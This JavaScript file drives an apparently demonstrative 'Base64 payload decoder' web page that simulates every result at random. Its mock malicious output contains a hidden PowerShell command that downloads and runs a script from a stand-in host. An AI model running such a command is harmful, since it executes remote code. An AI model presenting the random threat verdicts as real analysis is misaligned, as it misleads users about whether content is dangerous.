document.addEventListener('DOMContentLoaded', function() {
    const base64Input = document.getElementById('base64Input');
    const decodePayload = document.getElementById('decodePayload');
    const clearAll = document.getElementById('clearAll');
    const copyDecoded = document.getElementById('copyDecoded');
    const decodedOutput = document.getElementById('decodedOutput');

    // Decode payload
    decodePayload.addEventListener('click', function() {
        const input = base64Input.value.trim();
        
        if (!input) {
            alert('Please enter Base64 encoded payload to decode.');
            return;
        }

        decodeBase64Payload(input);
    });

    // Clear all
    clearAll.addEventListener('click', function() {
        base64Input.value = '';
        decodedOutput.value = '';
        clearResults();
    });

    // Copy decoded output
    copyDecoded.addEventListener('click', function() {
        if (decodedOutput.value) {
            decodedOutput.select();
            document.execCommand('copy');
            alert('Decoded output copied to clipboard!');
        }
    });

    // Decode Base64 payload
    function decodeBase64Payload(input) {
        // Display decoding results (simulated)
        document.getElementById('originalLength').textContent = 'Decoding...';
        document.getElementById('decodedLength').textContent = 'Decoding...';
        document.getElementById('compression').textContent = 'Decoding...';
        document.getElementById('encodingType').textContent = 'Decoding...';

        // Simulate decoding process
        setTimeout(function() {
            try {
                // In a real implementation, you would decode the Base64
                // For demonstration, we'll simulate results
                const originalLength = input.length;
                const decodedLength = Math.floor(originalLength * 0.75); // Approximate
                const isCompressed = Math.random() > 0.5;
                const encodingType = detectEncodingType(input);

                document.getElementById('originalLength').textContent = originalLength + ' characters';
                document.getElementById('decodedLength').textContent = decodedLength + ' bytes';
                document.getElementById('compression').textContent = isCompressed ? 'Possibly Compressed' : 'Uncompressed';
                document.getElementById('encodingType').textContent = encodingType;

                // Display security analysis
                const payloadType = detectPayloadType(input);
                const threatLevel = payloadType === 'Malicious' ? 'Critical' : 'Medium';
                const indicators = payloadType === 'Malicious' ? 'Suspicious strings, executable code' : 'No obvious threats';

                document.getElementById('payloadType').textContent = payloadType;
                document.getElementById('threatLevel').textContent = threatLevel;
                document.getElementById('suspiciousIndicators').textContent = indicators;
                document.getElementById('recommendations').textContent = payloadType === 'Malicious' ? 
                    'Do not execute, analyze in sandbox' : 'No immediate action required';

                // Generate mock decoded output
                const decoded = generateMockDecodedOutput(payloadType);
                decodedOutput.value = decoded;

                // Generate mock hex dump
                const hexDump = generateMockHexDump(decoded);
                document.getElementById('hexDump').textContent = hexDump;
            } catch (error) {
                alert('Error decoding Base64: ' + error.message);
            }
        }, 2000);
    }

    // Detect encoding type
    function detectEncodingType(input) {
        // In a real implementation, you would analyze the Base64 string
        const types = ['Standard Base64', 'URL-Safe Base64', 'Custom Base64'];
        return types[Math.floor(Math.random() * types.length)];
    }

    // Detect payload type
    function detectPayloadType(input) {
        // In a real implementation, you would analyze the decoded content
        const types = ['Malicious', 'Benign', 'Unknown'];
        return types[Math.floor(Math.random() * types.length)];
    }

    // Generate mock decoded output
    function generateMockDecodedOutput(type) {
        if (type === 'Malicious') {
            return `MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00
This is a simulated malicious payload with suspicious strings:
cmd.exe /c powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
CreateProcessA
WinExec
socket
connect
send
recv`;
        } else {
            return `This is a benign text payload.
It contains no malicious code.
Just regular text content for demonstration purposes.`;
        }
    }

    // Generate mock hex dump
    function generateMockHexDump(decoded) {
        return `00000000  54 68 69 73 20 69 73 20  61 20 62 65 6e 69 67 6e  |This is a benign|
00000010  20 74 65 78 74 20 70 61  79 6c 6f 61 64 2e 0a 49  | text payload..I|
00000020  74 20 63 6f 6e 74 61 69  6e 73 20 6e 6f 20 6d 61  |t contains no ma|
00000030  6c 69 63 69 6f 75 73 20  63 6f 64 65 2e 0a 4a 75  |licious code..Ju|
00000040  73 74 20 72 65 67 75 6c  61 72 20 74 65 78 74 20  |st regular text |
00000050  63 6f 6e 74 65 6e 74 20  66 6f 72 20 64 65 6d 6f  |content for demo|
00000060  6e 73 74 72 61 74 69 6f  6e 20 70 75 72 70 6f 73  |nstration purpos|
00000070  65 73 2e                                          |es.|`;
    }

    // Clear results
    function clearResults() {
        document.getElementById('originalLength').textContent = '-';
        document.getElementById('decodedLength').textContent = '-';
        document.getElementById('compression').textContent = '-';
        document.getElementById('encodingType').textContent = '-';
        document.getElementById('payloadType').textContent = '-';
        document.getElementById('threatLevel').textContent = '-';
        document.getElementById('suspiciousIndicators').textContent = '-';
        document.getElementById('recommendations').textContent = '-';
        document.getElementById('hexDump').textContent = '';
        decodedOutput.value = '';
    }

    // Add Nandha's expertise insight
    function addNandhaInsight() {
        const insightCard = document.querySelector('.insight-item');
        if (insightCard) {
            insightCard.innerHTML += `
                <div class="mt-3">
                    <p class="small text-muted">
                        <i class="fas fa-user me-2"></i>
                        Expert insight by <a href="https://www.linkedin.com/in/nandha-kumar-m-952342159/" target="_blank">Nandha Kumar M</a>
                    </p>
                </div>
            `;
        }
    }

    // Initialize Nandha's insight
    addNandhaInsight();
});